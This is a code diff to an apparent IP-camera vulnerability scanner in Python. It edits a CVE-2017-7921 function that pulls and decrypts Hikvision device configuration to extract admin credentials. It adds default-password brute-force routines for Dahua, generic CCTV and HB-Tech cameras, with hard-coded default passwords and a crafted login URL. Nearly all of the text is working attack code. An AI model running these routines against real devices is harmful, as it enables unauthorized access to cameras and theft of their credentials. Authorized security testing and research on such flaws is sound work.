@@ -31,14 +31,15 @@ def cve_2017_7921(ip: str) -> list:
             f.write(rc.content)
         info = eval(os.popen(f"python3 scan/lib/decrypt_configure.py {ip}-config").readline().strip())
         idx = - info[::-1].index('admin')
-        info = info[idx - 1: ]
+        info = info[idx - 1: idx - 1 + 4]
         os.remove(f"{ip}-config")
         return [True, 'Hikvision', 'cve-2017-7921', str(info)]
     return [False, 'Hikvision', 'cve-2017-7921']
 
 
-def hik_weak(ip, users=['admin'], passwords=['12345']) -> list:
+def hik_weak(ip: str, users: list=['admin'], passwords: list=['12345']) -> list:
     """海康威视弱口令扫描 & 也可使用密码字典进行爆破"""
+    passwords = set(passwords + ['12345'])
     headers = {'User-Agent': get_user_agent()}
     for user in users:
         for p in passwords:
@@ -48,8 +49,9 @@ def hik_weak(ip, users=['admin'], passwords=['12345']) -> list:
     return [False, 'Hikvision', 'weak pass']
 
 
-def dahua_weak(ip, users=['admin'], passwords=['admin']) -> list:
+def dahua_weak(ip: str, users: list=['admin'], passwords: list=['admin']) -> list:
     """大华摄像机弱口令扫描 & 也可使用密码字典进行爆破"""
+    passwords = set(passwords + ['admin'])
     headers = {
         'User-Agent': get_user_agent(),
         'Host': ip,
@@ -125,7 +127,34 @@ def cve_2020_25078(ip: str) -> list:
     return [False, 'DLink', 'cve-2020-25078']
 
 
+def cctv_weak(ip: str, users: list=['admin'], passwords: list=['']) -> list:
+    """CCTV摄像机弱口令扫描 & 也可使用密码字典进行爆破"""
+    passwords = set(passwords + [''])
+    headers = {'User-Agent': get_user_agent()}
+    for user in users:
+        for p in passwords:
+            url = f'http://{ip}/cgi-bin/gw.cgi?xml=<juan ver="" squ="" dir="0"><rpermission usr="{user}" pwd="{p}"><config base=""/><playback base=""/></rpermission></juan>'
+            r = requests.get(url, headers=headers, verify=False, timeout=timeout)
+            if r.status_code == 200 and '<rpermission' in r.text:
+                items = r.text.split()
+                idx = items.index('<rpermission')
+                if '0' in items[idx + 1]:
+                    return [True, 'CCTV', 'weak pass', f"{user}:{p}"]
+    return [False, 'CCTV', 'weak pass']
+
+
+def hb_weak(ip: str, users: list=['admin'], passwords: list=['888888']) -> list:
+    """汉邦高科弱口令扫描 & 也可使用密码字典进行爆破"""
+    passwords = set(passwords + ['888888'])
+    headers = {'User-Agent': get_user_agent()}
+    for user in users:
+        for p in passwords:
+            r = requests.get(f"http://{ip}/ISAPI/Security/userCheck", verify=False, headers=headers, timeout=timeout, auth=(user, p))
+            if r.status_code == 200 and '200' in r.text:
+                return [True, 'HB-Tech', 'weak pass', f"{user}:{p}"]
+    return [False, 'HB-Tech', 'weak pass']
+
+
 if __name__ == '__main__':
     # print(cve_2021_36260('10.101.35.74'))
-    #  print(dahua_weak('172.17.211.3'))
-    print(cve_2021_33044('172.17.211.3'))
+    print(dahua_weak('172.17.211.3'))
